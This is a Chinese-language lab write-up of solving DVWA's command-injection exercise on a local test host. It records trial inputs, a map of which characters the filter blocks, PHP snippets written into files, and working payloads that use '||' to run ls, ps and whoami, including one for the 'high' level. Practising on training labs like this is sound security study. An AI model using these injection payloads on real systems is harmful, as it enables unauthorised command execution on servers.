# Command Injection

> Objective: Remotely, find out the user of the web service on the OS, as well as the machines hostname via RCE.
>

可以直接跳過中間嘗試的部分，看結尾就好

先隨意 try try

```bash
1.1.11
```

```bash
1.1.&1
```

```bash
1.1.1.&1
```

```bash
1.1.1.1-1
```

```bash
1.1.1.-----1
```

...

感覺朝這方向會有點搞頭

```bash
$0
```

```bash
010010010001
```
```bash
0x8.0x8.0x8.0x8
```
```bash
0xFFFFFFFF
```
繼續 try...

感覺有機可趁

```bash
2&1 > ./test.txt
```
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/e3709c2d-852a-4848-aa58-51a5b21011f5/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220217%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220217T165314Z&X-Amz-Expires=86400&X-Amz-Signature=a37e45568800afd982135b1a39accf76ad6b9ca5e91b700ca7278a259a4662e1&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

```bash
http://dvwa.localtest/vulnerabilities/exec/test.txt
```
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/6202a48c-cf09-4a00-a071-5665787a07f0/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220217%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220217T165340Z&X-Amz-Expires=86400&X-Amz-Signature=76e68e003c9baa4fc0c0bb8bb5bd9c78e5ff3dd2169d244c8e805740da703b5b&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

```bash
"1.1.1.1 <?php> echo 'hello'; ?>"> ./test.txt
```
```bash
"1.1.1.1 <?php echo 'hello'; ?>"> ./test.php
```
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/2e5c0601-5e91-4a25-ae1c-2a7cf5129d44/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220217%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220217T165415Z&X-Amz-Expires=86400&X-Amz-Signature=0356aa3fb149afcb82cc9e8da5e0d2c6dced0cc2c32ea86bc8b809a21ef7943f&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

```bash
"1.1.1.1 <?php echo phpinfo(); ?>"> ./test.php
```

```bash
'1.1.1.1 <?php echo "<script>alert(1)</script>" ?>' &> ./test.php
```

```bash
'1.1.1.1 <?php eval\x28pwd\x29; ?>' &> ./test.php
```

```bash
http://dvwa.localtest/vulnerabilities/exec/test.php
```

500 代表有效果了
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/bf46c7e0-f170-4cb0-8653-de0ae206d543/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220217%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220217T165439Z&X-Amz-Expires=86400&X-Amz-Signature=07ce759b20ccbb2bdeee0238b2f7a8a70e926879ed55345109b8a83ee6c6ea98&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)
崩潰 😭  先去躺平休息一下

試著塞入單引號和分隔字串
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/a462ebc4-fba7-4a23-ad9f-34c69d67073c/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220217%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220217T165501Z&X-Amz-Expires=86400&X-Amz-Signature=6ffe29f0e290715746b11fb2727bd70aedd452a6b28761594025f0e1d9321a10&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

實在是沒招了，觀察看看哪些字元有被過濾

```jsx
'1.1.1.1    =-+_)(*&^%$#@!,./<>?;:][{}'  > ./log.txt
```

```jsx
PING 1.1.1.1    =+_*^%#@!,./<>?:][{} (1.1.1.1): 56 data bytes
64 bytes from 1.1.1.1: icmp_seq=0 ttl=55 time=9.075 ms
64 bytes from 1.1.1.1: icmp_seq=1 ttl=55 time=8.122 ms
64 bytes from 1.1.1.1: icmp_seq=2 ttl=55 time=12.018 ms
64 bytes from 1.1.1.1: icmp_seq=3 ttl=55 time=9.620 ms

--- 1.1.1.1    =+_*^%#@!,./<>?:][{} ping statistics ---
4 packets transmitted, 4 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 8.122/9.709/12.018/1.437 ms
```

被視為合法:

```jsx
=+_*^%#@!~ <>/?[]{} ,.\|/:

```

被過濾:

```jsx
-)(&`$;
```

但要留意的是有些被過濾的字元若跟某些字元一起使用會被視為例外, 例如 `&>`

先回到這邊，只少能寫入檔案了，但如果要靠寫入檔案的方式寫成另一隻可執行檔，缺少太多可用字元

```jsx
'127.0.0.1' &> ./log.txt
```

### Done

終於 try 成功 😇

後面加上 `||` 就可以執行了

```jsx
'127.0.0.1'  > ./log.txt || ls
```

`|grep` 的 `|` 和  `grep` 之間不能有空白

```jsx
'127.0.0.1'  > ./log.txt || ps aux |grep httpd
```

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/7e9c489f-ea1f-410c-bd30-b05598411a13/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220217%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220217T165531Z&X-Amz-Expires=86400&X-Amz-Signature=ccab9e0982fed2d340e4066889908b6aece9b1708a1c0664b6abc4a5ecf0b303&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

```jsx
www-data   346  0.0  0.0   4296   756 ?        S    15:42   0:00 sh -c ping  -c 4 '127.0.0.1'  > ./log.txt |ps aux |grep httpd

www-data   349  0.0  0.0  11120   940 ?        S    15:42   0:00 grep httpd
```

### 心得

原本也有想過一些比較華麗但不切實際的方式，例如分段寫入或者覆蓋某些字元以達到想要的輸出檔案結果之類的...

有時候不用想太複雜，盡量先順著可行性高的方嘗試

### update

這樣也能通過 high 的難度

```bash
'127.0.0.1' || whoami
```

```bash
'' || ls ../
``
